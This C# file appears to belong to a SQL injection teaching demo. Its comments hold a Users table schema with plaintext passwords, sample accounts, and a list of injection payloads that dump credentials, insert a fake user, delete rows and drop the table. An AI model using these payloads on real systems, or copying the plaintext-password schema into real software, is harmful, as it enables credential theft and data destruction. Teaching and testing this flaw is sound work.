public class DatabaseConnection
{
    //database connection string
    public static readonly string ConnectionString = "";


    /* --------------------   SQL code   --------------------

    --table definition
    CREATE TABLE [dbo].[Users] (
        [name]     NVARCHAR (50) NOT NULL,
        [password] NVARCHAR (50) NOT NULL,
        [email]    NVARCHAR (50) NOT NULL,
        [phone]    NVARCHAR (50) NOT NULL,
        CONSTRAINT [PK_Users] PRIMARY KEY CLUSTERED ([name] ASC)
    );

    --initial table data
    GO
    INSERT INTO Users ([name], [password], [email], [phone]) VALUES 
    ('Alice', 'password', 'alice@email.com', 1234567890),
    ('Bob', 'test', 'bob@email.com', 1235550001),
    ('Cheryl', 'demo', 'cheryl@email.com', 1235550002),
    ('Dylan', 'example', 'dylan@email.com', 1235550003),
    ('Eric', 'notarealpassword', 'eric@email.com', 1235550004),
    ('Fred', 'pass', 'fred@email.com', 1235550005);

    */


    /* ----------   SQL injection code snippets   ----------

    //select info for all users
    ' OR 1 = 1 --

    //select username / passwords for all users
    ' UNION (SELECT [name], [password] FROM Users) --

    //dump full database
    ' OR 1 = 1 UNION (SELECT [name], [password] FROM Users) --

    //insert fraudulent data
    ' INSERT INTO Users VALUES ('Hacked', 'youvebeenhacked', 'hacked@hacked.com', '0000000000') --

    //delete all data
    ' DELETE FROM Users --

    //drop table
    ' DROP TABLE Users --

    //dump and purge all data
    ' OR 1 = 1 UNION (SELECT [name], [password] FROM Users) DROP TABLE Users --

    */
}